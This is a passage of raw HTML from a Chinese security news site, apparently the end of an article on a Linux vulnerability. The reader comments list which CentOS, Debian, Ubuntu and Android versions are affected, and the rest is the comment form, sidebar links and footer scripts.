           <a onclick="return addComment.moveForm( 'comment-203788','203788', 'respond','122152' ) " href="?replytocom=203788#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">12楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>centos5、6不受影响，centos7 不开启namespaces也不受影响！</p>
<div class="comment-tools">
<div class="vote" id="vote-203788"><span id="acv_stat_203788"></span><a class="ilike_icon"  id="vote4-203788" href="javascript:acv_vote(203788,1);">亮了</a>(<span id="cos_support-203788">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="203788" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="203788" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="203788" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="203788" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="203788" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-249206 odd alt thread-even depth-1" id="li-comment-203789">
    <div id="comment-203789">
        <div class="photo"> <a href="http://www.freebuf.com/author/咸蛋">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/咸蛋" target="_blank">咸蛋&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2016-12-09</span>
		<span class="time"> </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-203789','203789', 'respond','122152' ) " href="?replytocom=203789#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">13楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>Debian 7、8系列均受影响，Ubuntu 12.04、14.04、16.04系列均受影响</p>
<div class="comment-tools">
<div class="vote" id="vote-203789"><span id="acv_stat_203789"></span><a class="ilike_icon"  id="vote4-203789" href="javascript:acv_vote(203789,1);">亮了</a>(<span id="cos_support-203789">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="203789" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="203789" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="203789" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="203789" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="203789" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-231742 even thread-odd thread-alt depth-1" id="li-comment-203792">
    <div id="comment-203792">
        <div class="photo"> <a href="http://www.freebuf.com/author/欧阳洋葱">
    <img src="http://image.3001.net/2016/06/h_large_cMwt_0851000057b11376.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/欧阳洋葱" target="_blank">欧阳洋葱&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(7级)</span>
				<span class="explain"> 专业从事飞碟修理，飞碟引擎、碟面、舱体维修均受理，详情请私信... </span>
		<span class="time">&nbsp;2016-12-09</span>
		<span class="time"> </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-203792','203792', 'respond','122152' ) " href="?replytocom=203792#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">14楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>Android十二月更新也修复了这一漏洞&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-203792"><span id="acv_stat_203792"></span><a class="ilike_icon"  id="vote4-203792" href="javascript:acv_vote(203792,1);">亮了</a>(<span id="cos_support-203792">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="203792" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="203792" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="203792" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="203792" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="203792" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p><span>必须</span><span>您当前尚未登录。<a  class="simplemodal-login" href="http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Ffreebuf.com%2Fvuls%2F122152.html" title="登陆">登陆？</a><a  href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">注册</a></span></div>
		<div class="login-input">
		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required /></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys" >
           <a title="mrgreen" href="javascript:grin(':mrgreen:')"><img src="http://image.3001.net/images/index/smilies/icon_mrgreen.gif" /></a><a title="razz" href="javascript:grin(':razz:')"><img src="http://image.3001.net/images/index/smilies/icon_razz.gif" /></a><a title="sad" href="javascript:grin(':sad:')"><img src="http://image.3001.net/images/index/smilies/icon_sad.gif" /></a><a title="smile" href="javascript:grin(':smile:')"><img src="http://image.3001.net/images/index/smilies/icon_smile.gif" /></a><a title="oops" href="javascript:grin(':oops:')"><img src="http://image.3001.net/images/index/smilies/icon_redface.gif" /></a><a title="grin" href="javascript:grin(':grin:')"><img src="http://image.3001.net/images/index/smilies/icon_biggrin.gif" /></a><a title="eek" href="javascript:grin(':eek:')"><img src="http://image.3001.net/images/index/smilies/icon_surprised.gif" /></a><a title="???" href="javascript:grin(':???:')"><img src="http://image.3001.net/images/index/smilies/icon_confused.gif" /></a><a title="cool" href="javascript:grin(':cool:')"><img src="http://image.3001.net/images/index/smilies/icon_cool.gif" /></a><a title="lol" href="javascript:grin(':lol:')"><img src="http://image.3001.net/images/index/smilies/icon_lol.gif" /></a><a title="mad" href="javascript:grin(':mad:')"><img src="http://image.3001.net/images/index/smilies/icon_mad.gif" /></a><a title="twisted" href="javascript:grin(':twisted:')"><img src="http://image.3001.net/images/index/smilies/icon_twisted.gif" /></a><a title="roll" href="javascript:grin(':roll:')"><img src="http://image.3001.net/images/index/smilies/icon_rolleyes.gif" /></a><a title="wink" href="javascript:grin(':wink:')"><img src="http://image.3001.net/images/index/smilies/icon_wink.gif" /></a><a title="idea" href="javascript:grin(':idea:')"><img src="http://image.3001.net/images/index/smilies/icon_idea.gif" /></a><a title="arrow" href="javascript:grin(':arrow:')"><img src="http://image.3001.net/images/index/smilies/icon_arrow.gif" /></a><a title="neutral" href="javascript:grin(':neutral:')"><img src="http://image.3001.net/images/index/smilies/icon_neutral.gif" /></a><a title="cry" href="javascript:grin(':cry:')"><img src="http://image.3001.net/images/index/smilies/icon_cry.gif" /></a><a title="?" href="javascript:grin(':?:')"><img src="http://image.3001.net/images/index/smilies/icon_question.gif" /></a><a title="evil" href="javascript:grin(':evil:')"><img src="http://image.3001.net/images/index/smilies/icon_evil.gif" /></a><a title="shock" href="javascript:grin(':shock:')"><img src="http://image.3001.net/images/index/smilies/icon_eek.gif" /></a><a title="!" href="javascript:grin(':!:')"><img src="http://image.3001.net/images/index/smilies/icon_exclaim.gif" /></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)" />
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type='hidden' name='comment_post_ID' value='122152' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="tq6icv" />
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
        });
    });    
});
</script>    </div>
        <div class="col-md-3 visible-md-block visible-lg-block">
      <div class="panel panel-default">
        <div class="author-wrap">
          <div class="author-header"><img src="http://image.3001.net/2014/06/0.jpg" width="100" height="100" alt="漏洞盒子" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo" /></div>
          <p class="name"><a href="http://www.freebuf.com/author/%e6%bc%8f%e6%b4%9e%e7%9b%92%e5%ad%90" title="由 漏洞盒子 发布" rel="author">漏洞盒子</a><span><a href="http://www.freebuf.com/bufer" target="_blank"><img src="http://image.3001.net/images/index/f2.png" title="认证厂商"></a></span></p>
          <p class="signature">互联网安全测试平台</p>
          <p class="art-com"><span class="aut-article"><a href="/author/漏洞盒子" target="_blank">84篇文章</a></span><span class="aut-comment"><a href="/author/漏洞盒子?comment=1" target="_blank">4条评论</a></span></p>
        </div>
      </div>
	  <script type="text/javascript">
	          var dispatch = function() {
              q = document.getElementById("q");
              if (q.value != "") {
                  window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                     return false;
                   } else {
                       return false;
                       }
             }
	  </script>
      <div class="form-group has-active search-col search-in">
        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
          <div class="form-group">
            <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
            <button class="submit" onclick="INTEL_TYPE_AHEAD.onSubmitHps(' 关键字查找', '/content/www/cn/zh', 'zh_CN')" value="Search" type="submit"></button>
          </div>
        </form>
      </div>
      <div class="ad-right" style="margin-bottom:24px;">
        <a href="http://www.huodongxing.com/event/2351278105600" target="_blank"><img src="http://image.3001.net/images/20161118/14794591326254.jpg"></a>
      </div>
   
      <div class="panel panel-default">
        <div class="read visible-md-block visible-lg-block">
          <div class="main-tit02">
            <h3>相关阅读</h3>
          </div>		
          <ul>
  <li><a href="http://www.freebuf.com/vuls/6364.html" target="_blank">MySQL（Linux）远程数据库提权漏洞</a></li>
  
  <li><a href="http://www.freebuf.com/news/topnews/90492.html" target="_blank">POSIX shell技巧分享篇</a></li>
  
  <li><a href="http://www.freebuf.com/sectool/6370.html" target="_blank">MySQL(Windows)远程提权漏洞[附扫描及利用程序]</a></li>
  
  <li><a href="http://www.freebuf.com/news/66369.html" target="_blank">数千Linux和FreeBSD服务器感染Mumblehard恶意软件</a></li>
  
  <li><a href="http://www.freebuf.com/sectool/121847.html" target="_blank">Linux提权？这四个脚本可以帮助你</a></li>
  </ul>        </div>
      </div>
      <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
      <div class="panel panel-default rec-spe">
        <div class="main-tit03 colour-blue">
          <h3>特别推荐</h3>
        </div>
         
      </div>
	  <div id="mar-right">
      <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
      <div class="panel panel-default code"> <img src="http://image.3001.net/images/new/code.jpg" width="192" height="192">
        <p>关注我们  分享每日精选文章</p>
      </div>
	  </div>
    </div>
  </div>
  <div class="row marvellous visible-lg-block">
    <h3>不容错过</h3>
    <ul>
      <li><a href="http://www.freebuf.com/articles/web/121679.html" rel="bookmark" title="Splunk+蜜罐+防火墙=简易WAF">Splunk+蜜罐+防火墙=简易WAF</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/ripz" title="由 RipZ 发布" rel="author">RipZ</a></span>
		  		<span class="time">2016-12-05</span></p>
      </li>
      <li><a href="http://www.freebuf.com/articles/network/107900.html" rel="bookmark" title="SWIFT惊天银行大劫案全程分析">SWIFT惊天银行大劫案全程分析</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/%e7%99%bd%e6%b3%bd%e5%ae%89%e5%85%a8%e5%9b%a2%e9%98%9f" title="由 白泽安全团队 发布" rel="author">白泽安全团队</a></span>
		  		<span class="time">2016-06-29</span></p>
      </li>
      <li><a href="http://www.freebuf.com/geek/100735.html" rel="bookmark" title="极客DIY：如何构建一台属于自己的基站">极客DIY：如何构建一台属于自己的基站</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/%e4%ba%b2%e7%88%b1%e7%9a%84%e5%85%94%e5%ad%90" title="由 亲爱的兔子 发布" rel="author">亲爱的兔子</a></span>
		  		<span class="time">2016-04-06</span></p>
      </li>
      <li><a href="http://www.freebuf.com/news/105921.html" rel="bookmark" title="《通天神偷》之溜进某电力公司服务器">《通天神偷》之溜进某电力公司服务器</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/%e9%a5%ad%e5%9b%a2%e5%90%9b" title="由 饭团君 发布" rel="author">饭团君</a></span>
		  		<span class="time">2016-06-03</span></p>
      </li>
    </ul>
  </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list col-sm-2 col-md-2">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
        <li><a href="http://www.freebuf.com/donate">捐助我们</a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <ul>
      </ul>
    </div>
    <div class="footer-logo col-sm-2 col-md-2 pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2013 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=775128824" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
